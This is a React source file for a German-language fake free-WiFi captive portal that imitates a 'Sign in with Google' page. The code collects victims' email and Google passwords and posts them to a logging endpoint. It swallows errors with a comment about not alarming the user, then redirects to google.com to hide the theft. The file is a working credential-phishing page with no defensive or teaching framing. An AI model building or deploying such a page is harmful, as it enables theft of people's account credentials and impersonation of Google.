import React, { useState } from 'react';
import './App.css';

function App() {
  const [showLoginForm, setShowLoginForm] = useState(false);
  const [showGoogleForm, setShowGoogleForm] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [googleEmail, setGoogleEmail] = useState('');
  const [googlePassword, setGooglePassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleStandardLogin = () => {
    setShowLoginForm(true);
    setShowGoogleForm(false);
  };

  const handleGoogleLogin = () => {
    setShowGoogleForm(true);
    setShowLoginForm(false);
  };

  const sendData = async (data) => {
    try {
      // Verwende Port 6666 für Server-Endpunkt
      const url = 'http://localhost:4800/api/log';

      await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      });

      // Optional: Hier kann die Verarbeitung der Antwort erfolgen
    } catch (error) {
      console.error('Error:', error);
      // Fehler leise behandeln, um den Benutzer nicht zu alarmieren
    }
  };

  const handleLoginSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    await sendData({
      type: 'email',
      email,
      password
    });

    // Weiterleitung nach kurzer Verzögerung
    setTimeout(() => {
      window.location.href = "https://www.google.com";
    }, 1000);
  };

  const handleGoogleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    await sendData({
      type: 'google',
      email: googleEmail,
      password: googlePassword
    });

    // Weiterleitung nach kurzer Verzögerung
    setTimeout(() => {
      window.location.href = "https://www.google.com";
    }, 1000);
  };

  return (
    <div className="container">
      <div className="status-bar">
        <div className="wifi-name">Free_WiFi_Hotspot</div>
        <div className="signal-strength">
          <div className="signal-bar"></div>
          <div className="signal-bar"></div>
          <div className="signal-bar"></div>
          <div className="signal-bar inactive"></div>
          <div className="signal-bar inactive"></div>
        </div>
      </div>

      <div className="header">
        <div className="wifi-icon">
          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 6C8.62 6 5.5 7.12 3 9.09L12 21L21 9.09C18.5 7.12 15.38 6 12 6Z" fill="#2C2E3B" fillOpacity="0.7"/>
            <path d="M12 3C7.95 3 4.21 4.34 1.2 6.6L3 9.09C5.5 7.12 8.62 6 12 6C15.38 6 18.5 7.12 21 9.09L22.8 6.6C19.79 4.34 16.05 3 12 3Z" fill="#2C2E3B" fillOpacity="0.4"/>
          </svg>
        </div>
        <h1>WLAN-Anmeldung erforderlich</h1>
        <p>Melde dich an, um auf das Internet zuzugreifen.</p>
      </div>

      {!showLoginForm && !showGoogleForm && (
        <>
          <button onClick={handleGoogleLogin} className="google-btn">
            <svg className="google-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
              <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
              <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
              <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
              <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
              <path fill="none" d="M0 0h48v48H0z"/>
            </svg>
            <span className="google-text">Mit Google anmelden</span>
          </button>

          <div className="divider">
            <div className="divider-line"></div>
            <div className="divider-text">ODER</div>
            <div className="divider-line"></div>
          </div>

          <button onClick={handleStandardLogin} className="submit-btn">Mit E-Mail anmelden</button>
        </>
      )}

      {showLoginForm && (
        <form onSubmit={handleLoginSubmit} className="form">
          <div className="form-group">
            <label htmlFor="email">E-Mail</label>
            <input
              type="email"
              id="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
          </div>
          <div className="form-group">
            <label htmlFor="password">Passwort</label>
            <input
              type="password"
              id="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
          </div>
          <button type="submit" className="submit-btn" disabled={isSubmitting}>
            {isSubmitting ? 'Wird angemeldet...' : 'Anmelden'}
          </button>
        </form>
      )}

      {showGoogleForm && (
        <form onSubmit={handleGoogleSubmit} className="form">
          <div className="form-group">
            <label htmlFor="google-email">Google-E-Mail</label>
            <input
              type="email"
              id="google-email"
              value={googleEmail}
              onChange={(e) => setGoogleEmail(e.target.value)}
              required
            />
          </div>
          <div className="form-group">
            <label htmlFor="google-password">Google-Passwort</label>
            <input
              type="password"
              id="google-password"
              value={googlePassword}
              onChange={(e) => setGooglePassword(e.target.value)}
              required
            />
          </div>
          <button type="submit" className="submit-btn" disabled={isSubmitting}>
            {isSubmitting ? 'Wird angemeldet...' : 'Mit Google anmelden'}
          </button>
        </form>
      )}

      <div className="footer">
        <p>Durch die Anmeldung akzeptierst du die <a href="#">Nutzungsbedingungen</a> und <a href="#">Datenschutzrichtlinien</a>.</p>
      </div>
    </div>
  );
}

export default App;
